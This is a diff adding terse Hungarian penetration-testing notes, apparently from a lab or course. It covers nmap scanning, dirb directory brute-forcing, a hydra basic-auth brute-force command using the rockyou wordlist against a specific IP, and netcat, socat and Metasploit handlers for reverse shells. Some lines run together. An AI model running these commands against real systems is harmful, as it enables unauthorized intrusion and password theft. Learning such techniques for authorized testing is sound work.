@@ -1,0 +1,16 @@
+nmap -sS -sV <ip cim>dirb / dirbusterdirb <url> <szólista> kapcsolók
+dirb -r Rekurzív keresés kikapcsolása
+Almappákba belépne a rekurzív kereséssel és megnézne abban is 1000 mappát
+dirb -X
+File extension hozzáadása a szólistához
+Basic authentication(THC-) hydra (feltöri a basic authetication-t)
+A hydra nem latja a rossz belepest
+hydra -l <felhasznalonev> bejelentkezes felhasznalonevvel
+hydra -L bejelentkezes egy fajl szovegeivel
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 40.0.3.18 http-get /admin -s 80DT (directory traversal) sérülékenység
+UFU (unverified file upload) sérülékenység
+Reverse shellcsatlakozáshoz kell egy listener
+nc -nv <ip> <port>nc -lvnp <port>listener verbose n(megszokás) 
+portnetcat - tellnet on steroids
+socat - netcat on steroids
+m(eta)s(ploit) multi/handler
